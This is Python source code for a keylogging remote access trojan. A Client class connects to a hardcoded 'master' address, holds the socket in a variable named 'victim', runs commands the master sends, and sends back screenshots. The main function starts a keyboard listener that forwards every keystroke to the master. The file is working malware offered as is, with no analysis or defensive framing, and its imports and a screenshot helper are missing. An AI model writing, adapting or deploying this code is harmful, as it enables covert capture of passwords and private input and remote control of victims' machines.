class Client:

    def __init__(self, ip, port):
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.victim.connect((ip, port))


    def send_msg(self, msg):
        if hasattr(msg, '__len__'):
            if type(msg) == str:
                size = str(len(msg.encode('utf-8')))
                self.victim.send(size.encode('utf-8').ljust(64))
            elif type(msg) == bytes:
                size = str(len(msg))
                self.victim.send(size.encode('utf-8').ljust(64))

        else:
            return
        try:
            msg = msg.encode('utf-8')
            self.victim.send(msg)
        except:
            self.victim.send(msg)



    def recv_msg(self):
        size = self.victim.recv(64)
        if size.isdigit():
            msg = self.victim.recv(int(size.decode('utf-8')))
        else:
            return
        try:
            msg = msg.decode('utf-8')
            return msg
        except:
            return msg            


    def send_screeshot_to_master(self):
        with open('screenshot.png', 'rb') as pic:
            pic_bytes = pic.read()

        self.send_msg(pic_bytes)
        os.remove('screenshot.png')
        


    def _receive_command_from_master(self):
        while True:
            command = self.recv_msg()
            try:
                call(command, shell=False)
                if 'screenshot' in command:
                    self.send_screeshot_to_master()
            except:
                continue


    def receive_command_from_master(self):
        threading.Thread(target=self._receive_command_from_master, args=()).start()


def main():
    create_nir()
    client = Client('192.168.1.105', 9999)
    client.receive_command_from_master()

    def on_press(key):
        try:
            key = key.char
        except:
            key = '<' + key._name_ + '>'
            if key == '<space>':
                key = ' '

        client.send_msg(key)


    def on_release(key):
        pass


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == '__main__':
    main()

